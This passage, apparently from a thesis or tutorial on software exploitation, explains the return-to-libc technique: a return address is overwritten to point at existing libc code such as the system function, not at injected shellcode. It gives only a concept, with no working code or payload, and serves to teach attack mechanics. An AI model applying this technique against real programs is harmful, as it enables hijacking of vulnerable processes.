The entry mechanism behind this technique is the same as in the code injection case. The return address is overwritten with an attacker controlled address. However, this time instead of providing our shellcode, use existing code is made that is mapped inside the address space of the vulnerable process, in this case from LibC itself.

For example, The return address of a function can be overwritten with the address of the \emph{system} function.
